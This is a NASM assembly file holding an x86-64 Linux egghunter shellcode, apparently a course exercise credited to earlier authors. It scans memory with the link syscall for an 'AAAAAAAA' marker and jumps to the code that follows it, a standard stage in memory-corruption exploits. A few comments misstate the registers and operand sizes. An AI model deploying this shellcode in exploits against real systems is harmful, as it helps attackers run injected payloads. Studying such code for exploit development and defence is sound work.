;egghunter.nasm
;based upon blueglove's version
;minor edits by clubjk
;12 Oct 2017

global _start

section .text


_start:

	xor rax, rax
	xor rdx, rdx			; initialize the registers

page_alignment:
	or dx, 0xfff			; helps set up for page size (0xfff = 4095)

incrementer:
	inc rdx				; increase edx by 1

hunter:
	lea rdi, [rdx + 8]		; put the address of rdx plus 8 bytes into rbx for the syscall
	xor rax, rax			; clear out rax
	mov al, 0x56			; _NR_link  	
	xor rsi, rsi
	syscall				
	cmp al, 0xf2			; compare rax to 0xf2
	jz page_alignment		; page alignment
	mov rax, 0x4141414141414141	; put 'AAAAAAAA' in rax
	mov rdi, rdx			; mov our value in rdx into rdi
	scasq				; check  rax with dword at rdi
	jnz incrementer			; short jump if no match
	scasq				; if match, compare again
	jnz incrementer			; short jump if no match
	jmp rdi				; match, jump to pointer in rdi

